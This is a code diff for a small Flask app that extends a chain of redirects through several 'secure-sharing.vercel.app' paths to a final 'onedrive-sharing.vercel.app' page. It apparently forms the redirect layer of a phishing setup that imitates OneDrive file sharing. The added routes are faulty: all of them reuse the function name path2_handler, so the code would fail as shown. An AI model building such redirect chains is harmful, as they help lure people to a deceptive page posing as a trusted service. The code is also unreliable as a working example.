@@ -18,6 +18,8 @@ def get_redirect_url(path):
         return 'https://secure-sharing.vercel.app/path7'
     elif path == '/path7':
         return 'https://secure-sharing.vercel.app/path8'
+    elif path == '/path8':
+        return 'https://onedrive-sharing.vercel.app/'
     # Add more cases for additional paths and intermediary URLs as needed
     else:
         return 'https://onedrive-sharing.vercel.app/'
@@ -31,6 +33,36 @@ def path1_handler():
 @app.route('/path2')
 def path2_handler():
     return redirect(get_redirect_url('/path2'))
+
+# Route to handle redirection for '/path3'
+@app.route('/path3')
+def path2_handler():
+    return redirect(get_redirect_url('/path3'))
+
+# Route to handle redirection for '/path4'
+@app.route('/path4')
+def path2_handler():
+    return redirect(get_redirect_url('/path4'))
+
+# Route to handle redirection for '/path5'
+@app.route('/path5')
+def path2_handler():
+    return redirect(get_redirect_url('/path5'))
+
+# Route to handle redirection for '/path6'
+@app.route('/path6')
+def path2_handler():
+    return redirect(get_redirect_url('/path6'))
+
+# Route to handle redirection for '/path7'
+@app.route('/path7')
+def path2_handler():
+    return redirect(get_redirect_url('/path7'))
+
+# Route to handle redirection for '/path8'
+@app.route('/path8')
+def path2_handler():
+    return redirect(get_redirect_url('/path8'))
 
 # Route to handle redirection for other paths
 @app.route('/')
